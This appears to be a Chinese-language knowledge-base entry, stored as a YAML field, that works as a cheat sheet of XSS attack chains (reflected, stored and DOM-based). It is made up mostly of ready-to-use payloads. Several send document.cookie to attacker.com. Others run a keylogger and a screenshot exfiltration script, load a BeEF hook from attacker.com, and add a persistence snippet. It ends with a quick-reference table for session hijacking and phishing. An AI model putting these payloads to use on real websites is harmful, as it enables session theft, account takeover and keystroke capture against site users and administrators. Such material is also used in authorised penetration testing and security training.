knowledge: "# XSS攻击链\n\n## 反射型XSS攻击链\n\n### 基础利用\n\n```\n1. 探测XSS\n   <script>alert(1)</script>\n\n2. 绕过过滤\n   <img src=x\
  \ onerror=alert(1)>\n   <svg onload=alert(1)>\n\n3. 获取Cookie\n   <script>new Image().src=\"http://attacker.com/steal?c=\"\
  +document.cookie;</script>\n\n4. 窃取数据\n   http://attacker.com/steal?c=PHPSESSID=xxx\n```\n\n---\n\n## 存储型XSS攻击链\n\n### 长期钓鱼\n\
  \n```\n1. 寻找存储点\n   - 评论区\n   - 用户资料\n   - 帖子内容\n\n2. 植入Payload\n   <script>fetch('http://attacker.com/log?c='+document.cookie)</script>\n\
  \n3. 等待管理员访问\n   - 管理后台\n   - 审核页面\n\n4. 账户接管\n   - 使用窃取的Cookie登录\n```\n\n---\n\n## DOM型XSS攻击链\n\n### 前端利用\n\n```\n1. 探测DOM\
  \ sinks\n   - document.location\n   - document.URL\n   - eval()\n   - innerHTML\n\n2. 构造Payload\n   <img src=x onerror=location.href='http://attacker.com?c='+document.cookie>\n\
  \n3. 利用\n   - 重定向\n   - 窃取数据\n```\n\n---\n\n## 完整攻击链示例\n\n### 1. 基础Cookie窃取\n\n```html\n<script>\nnew Image().src=\"http://attacker.com/steal?c=\"\
  +document.cookie;\n</script>\n```\n\n### 2. 键盘记录\n\n```html\n<script>\ndocument.onkeypress=function(e){\n  new Image().src=\"\
  http://attacker.com/log?k=\"+e.key;\n}\n</script>\n```\n\n### 3. 屏幕截图\n\n```html\n<script>\nhtml2canvas(document.body).then(canvas\
  \ => {\n  fetch('http://attacker.com/upload', {\n    method: 'POST',\n    body: canvas.toDataURL()\n  });\n});\n</script>\n\
  ```\n\n### 4. BeEF钩子\n\n```html\n<script src=\"http://attacker.com:3000/hook.js\"></script>\n```\n\n### 5. 绕过CSP + 持久化\n\
  \n```html\n<script>\nif(window.name !== 'xss'){\n  window.name = 'xss';\n  fetch('http://attacker.com/persist?d='+document.cookie);\n\
  }\n</script>\n```\n\n---\n\n## 攻击链速查\n\n| 目标 | Payload | 说明 |\n|------|---------|------|\n| 弹窗测试 | `<script>alert(1)</script>`\
  \ | 基础测试 |\n| Cookie窃取 | `new Image().src=\"http://attacker?c=\"+document.cookie` | 会话劫持 |\n| 键盘记录 | `document.onkeypress=function(e){...}`\
  \ | 输入窃取 |\n| 重定向 | `location.href='http://attacker'` | 钓鱼 |\n| 持久化 | 存储型XSS | 长期控制 |\n"
